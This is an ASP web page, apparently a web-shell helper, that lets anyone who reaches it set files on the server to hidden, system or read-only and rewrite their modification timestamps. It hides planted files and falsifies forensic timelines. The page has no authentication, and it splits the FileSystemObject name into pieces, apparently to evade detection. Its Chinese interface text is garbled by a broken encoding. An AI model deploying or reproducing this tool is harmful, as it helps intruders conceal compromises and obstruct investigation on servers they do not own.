<%
dim path,FileName,NewTime,ShuXing
set path=request.Form("path")
set filename=request.Form("filename")
set newTime=request.Form("newTime")
set ShuXing=request.Form("shuxing")
%>
<font color=red>
<form method=post>
·����<input name='path' value='<%=server.MAppATH("/")%>\' size='40'> �ǵ�һ��Ҫ��\��β<br>
���ƣ�<input name=filename value='<%=filename%>' size='20'> �������,�����������ļ�<br>
ʱ�䣺<input name=newTime value='<%=newTime%>' size='20'>����12/21/2012 23:59:59  ���޸ĵĻ�,������<br>
���ԣ�<select onChange='this.form.shuxing.value=this.value;'>
<option value=''>��ͨ </option>
<option value='1'>ֻ��</option>
<option value='2'>����</option>
<option value='4'>ϵͳ</option>
<option value='34'>����|�浵</option>
<option value='33'>ֻ��|�浵</option>
<option value='35'>ֻ��|����|�浵</option>
<option value='39'>ֻ��|����|�浵|ϵͳ</option>
<input style="display:none" name=shuxing value='0' size='1'>
<input type=submit value=��ʼ> by �ó�
</form>
<%
if path<>"" then
Set fso=Server.CreateObject("Scri"&"pting.FileSyste"&"mObject")
Set shell=Server.CreateObject("Shell.Application")
'===============�����ļ���===============
if filename="" then '�ж����޸�ȫ�� ���ǵ���
Set objFolder=FSO.GetFolder(Path)
For Each objFile In objFolder.Files
fso.GetFile(objFile.Name).attributes=ShuXing
Next
Response.WRItE"�޸� "&path&" �µ��ļ����Գɹ�"
else
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Response.WRItE"�޸��ļ� "&path&fileName&" ������� "
end if
'===============����ʱ���===============
if newTime<>"" then '��������ݾ��޸�ʱ��
Set app_path=shell.NameSpace(server.mappath("."))

if filename="" then '�ж����޸�ȫ�� ���ǵ���
Set objFolder=FSO.GetFolder(Path)

For Each objFile In objFolder.Files
Set app_file=app_path.ParseName(objFile.Name)
app_file.Modifydate=newTime
Next
Response.WRItE"<br>�޸� "&path&" �µ��ļ���ʱ��ɹ�"
else
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
Response.WRItE"<br>�޸��ļ� "&path&fileName&" ʱ����� "
end if

end if


end if
%>
</font>